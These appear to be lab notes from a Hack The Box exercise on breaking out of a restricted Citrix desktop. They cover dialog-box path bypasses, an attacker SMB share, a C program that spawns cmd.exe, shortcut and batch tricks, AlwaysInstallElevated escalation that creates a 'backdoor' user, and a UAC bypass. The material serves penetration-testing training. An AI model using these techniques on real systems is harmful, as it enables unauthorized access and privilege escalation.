## Bypassing Path Restrictions
![](Citrix%20Breakout-20260824-103547.png)

Run `Paint` from start menu and click on `File > Open` to open the Dialog Box.

![](Citrix%20Breakout-20260824-103651.png)
![](Citrix%20Breakout-20260824-103711.png)
## Accessing SMB share from restricted environment

```shell
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
```
![](Citrix%20Breakout-20260824-103750.png)
![](Citrix%20Breakout-20260824-103816.png)

The executable `pwn.exe` is a custom compiled binary from `pwn.c` file which upon execution opens up the cmd.

```c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```
![](Citrix%20Breakout-20260824-103841.png)
## Alternate Explorer

![](Citrix%20Breakout-20260824-104002.png)

[Explorer++](https://explorerplusplus.com/) is highly recommended and frequently used in such situations due to its speed, user-friendly interface, and portability.
## Alternate Registry Editors

![](Citrix%20Breakout-20260824-104025.png)

Similarly when the default Registry Editor is blocked by group policy, alternative Registry editors can be employed to bypass the standard group policy restrictions. [Simpleregedit](https://sourceforge.net/projects/simpregedit/), [Uberregedit](https://sourceforge.net/projects/uberregedit/) and [SmallRegistryEditor](https://sourceforge.net/projects/sre/) are examples of such GUI tools that facilitate editing the Windows registry without being affected by the blocking imposed by group policy.
## Modify existing shortcut file

1. `Right-click` the desired shortcut.
2. Select `Properties`.
![](Citrix%20Breakout-20260824-104052.png)

3. Within the `Target` field, modify the path to the intended folder for access.
![](Citrix%20Breakout-20260824-104056.png)

4. Execute the Shortcut and cmd will be spawned
![](Citrix%20Breakout-20260824-104127.png)
## Script Execution

1. Create a new text file and name it "evil.bat".
2. Open "evil.bat" with a text editor such as Notepad.
3. Input the command "cmd" into the file.
![](Citrix%20Breakout-20260824-104149.png)

4. Save the file.
## Escalating Privileges

```cmd
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
        AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
    
Output Path
-----------
UserAdd.msi
```
![](Citrix%20Breakout-20260824-104250.png)

Back in CMD execute `runas` to start command prompt as the newly created `backdoor` user.

```cmd
C:\> runas /user:backdoor cmd
```
## Bypassing UAC

```cmd
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

```powershell
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1 

PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```
![](Citrix%20Breakout-20260824-104339.png)
![](Citrix%20Breakout-20260824-104343.png)
